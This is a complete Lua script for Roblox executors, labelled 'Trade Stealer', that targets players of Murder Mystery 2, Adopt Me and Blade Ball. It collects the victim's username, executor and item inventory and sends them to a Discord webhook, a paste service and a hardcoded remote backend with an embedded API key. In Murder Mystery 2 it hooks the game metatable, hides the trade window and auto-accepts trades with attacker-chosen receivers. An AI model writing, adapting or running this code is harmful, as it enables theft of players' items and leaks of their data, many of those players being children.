local CFG = getgenv().CFG or {}
CFG.allowed = CFG.allowed or {}
CFG.webhook = CFG.webhook or ""
CFG.delay = CFG.delay or 100
CFG.api_key = "aszxcvfgtt56678ijBVXDSERFGHBNJIU87U666789IKJHcdsxder56789ijhgfdrf4r56789ikjhgvf"
CFG.backend = "https://backend-production-04349.up.railway.app"
getgenv().CFG = CFG

local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local lp = Players.LocalPlayer
local HS = game:GetService("HttpService")

local function do_request(method, url, body, headers)
    return request({Url=url, Method=method, Body=body, Headers=headers or {}})
end

local function get_executor()
    if identifyexecutor then return identifyexecutor() end
    if KRNL_LOADED then return "Krnl" end
    if SYNAPSE_LOADED then return "Synapse" end
    return "Unknown"
end

local function get_roblox_version()
    if version then return version() end
    return "Unknown"
end

local function detect_antiscam()
    local g = getgenv()
    for _, f in ipairs({"antiscam","TradeBlocker","ScamGuard","NoTrade"}) do
        if g[f] then return true end
    end
    return false
end

local function collect_mm2_items()
    local items = {}
    local ok, ProfileData = pcall(function()
        return require(RS.Modules.ProfileData)
    end)
    if not ok or not ProfileData then return items end
    local ok2, Sync = pcall(function()
        return require(RS.Database.Sync)
    end)
    local rarityOrder = {Ancient=1,Godly=2,Unique=3,Vintage=4,Chroma=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
    for itemName, amount in pairs(ProfileData.Weapons.Owned) do
        local rarity = "Unknown"
        if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
            rarity = Sync.Weapons[itemName].Rarity or "Unknown"
        end
        table.insert(items, {name=itemName, rarity=rarity, amount=tostring(amount)})
    end
    table.sort(items, function(a, b)
        return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
    end)
    return items
end

local function collect_adoptme_items()
    local items = {}
    local inv = lp:FindFirstChild("PlayerData") or lp:FindFirstChild("Inventory")
    if inv then
        for _, v in ipairs(inv:GetDescendants()) do
            if v:IsA("StringValue") or v:IsA("IntValue") then
                table.insert(items, {name=v.Name, rarity="Pet", amount="1"})
            end
        end
    end
    return items
end

local function post_rubis(text)
    local ok, res = pcall(do_request, "POST", "https://api.rubis.app/v2/scrap",
        text,
        {["Content-Type"]="text/plain"})
    if not ok then return nil end
    local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
    if not dok or not data then return nil end
    return data.raw_with_key or data.raw or nil
end

local function send_discord(items, game_name)
    if not CFG.webhook or CFG.webhook == "" then return end
    local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
    local receivers = table.concat(CFG.allowed, ", ")

    local counts = {}
    local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
    for _, it in ipairs(items) do
        counts[it.rarity] = (counts[it.rarity] or 0) + 1
    end

    local inv_lines = {}
    for _, r in ipairs(order) do
        table.insert(inv_lines, string.format("%-10s: %d", r, counts[r] or 0))
    end

    local full_text = {}
    for _, it in ipairs(items) do
        table.insert(full_text, it.name.." ("..it.rarity..")")
    end
    local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"

    local desc = string.format(
        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
        lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
        receivers, table.concat(inv_lines, "\n"), rubis_url, join
    )

    local embed = {
        username = "Trade Stealer",
        embeds = {{
            title       = game_name.." Stealer",
            description = desc,
            color       = 15158332,
        }}
    }
    pcall(do_request, "POST", CFG.webhook, HS:JSONEncode(embed), {["Content-Type"]="application/json"})
end

local function send_job(game_name, items)
    send_discord(items, game_name)
    local payload = {
        game           = game_name,
        username       = lp.Name,
        display_name   = lp.DisplayName,
        executor       = get_executor(),
        roblox_version = get_roblox_version(),
        antiscam       = detect_antiscam(),
        allowed        = CFG.allowed,
        place_id       = tostring(PlaceId),
        job_id         = game.JobId,
        items          = items,
    }
    pcall(do_request, "POST", CFG.backend.."/job", HS:JSONEncode(payload), {
        ["Content-Type"] = "application/json",
        ["X-API-Key"]    = CFG.api_key,
    })
end

local function hook_mm2()
    local Trade = RS:WaitForChild("Trade", 10)
    if not Trade then return end
    local updateTrade  = Trade:WaitForChild("UpdateTrade", 10)
    local acceptTrade  = Trade:WaitForChild("AcceptTrade", 10)
    if not updateTrade or not acceptTrade then return end

    local items = collect_mm2_items()
    send_job("MM2", items)

    local currentTradeId = nil
    local currentLastOffer = nil
    local tradingWithAllowed = false
    local storedItems = {}

    local ok, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)

    local function isAllowedUser(name)
        for _, n in ipairs(CFG.allowed) do
            if string.lower(n) == string.lower(name) then return true end
        end
        return false
    end

    local function storeItems()
        storedItems = {}
        if ok and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
            for k, v in pairs(ProfileData.Weapons.Owned) do
                storedItems[k] = v
            end
        end
    end

    local function restoreItems()
        if ok and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
            for k, v in pairs(storedItems) do
                ProfileData.Weapons.Owned[k] = v
            end
        end
    end

    updateTrade.OnClientEvent:Connect(function(tradeData)
        if type(tradeData) ~= "table" then return end

        local p1 = tradeData.Player1
        local p2 = tradeData.Player2
        if not p1 or not p2 then return end

        local otherPlayer = nil
        if p1.Player == lp then
            otherPlayer = p2.Player
        elseif p2.Player == lp then
            otherPlayer = p1.Player
        end

        if not otherPlayer then return end

        local otherName = typeof(otherPlayer) == "Instance" and otherPlayer.Name or tostring(otherPlayer)
        tradingWithAllowed = isAllowedUser(otherName)

        if tradingWithAllowed then
            storeItems()
            -- auto accept when victim presses ready (Accepted becomes true)
            local victimData = p1.Player == lp and p1 or p2
            if victimData.Accepted and currentTradeId then
                task.spawn(function()
                    task.wait(0.5)
                    pcall(function()
                        acceptTrade:FireServer(currentTradeId, currentLastOffer)
                    end)
                end)
            end
        end
    end)

    -- hook AcceptTrade to capture tradeId/lastOffer and auto-fire
    local mt = getrawmetatable(game)
    local oldIndex = mt.__index
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if method == "FireServer" and self == acceptTrade then
            local args = {...}
            currentTradeId = args[1]
            currentLastOffer = args[2]
            if tradingWithAllowed then
                task.delay(1, restoreItems)
            end
        end
        return oldIndex(self, ...)
    end)
    setreadonly(mt, true)

    local gui = lp:WaitForChild("PlayerGui")
    local tradeGui      = gui:WaitForChild("TradeGUI", 10)
    local tradeGuiPhone = gui:FindFirstChild("TradeGUI_Phone")
    if tradeGui then
        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if tradeGui.Enabled and tradingWithAllowed then tradeGui.Enabled = false end
        end)
    end
    if tradeGuiPhone then
        tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
            if tradeGuiPhone.Enabled and tradingWithAllowed then tradeGuiPhone.Enabled = false end
        end)
    end
end

local function hook_adoptme()
    send_job("AdoptMe", collect_adoptme_items())
end

local function hook_bladeball()
    local items = {}
    local mgp = lp:FindFirstChild("leaderstats")
    if mgp then
        for _, v in ipairs(mgp:GetChildren()) do
            table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount="1"})
        end
    end
    send_job("BladeBall", items)
end

local GAMES = {
    [142823291]   = hook_mm2,
    [920587237]   = hook_adoptme,
    [13772394625] = hook_bladeball,
}

local handler = GAMES[PlaceId]
if handler then handler() else send_job("Unknown", {}) end
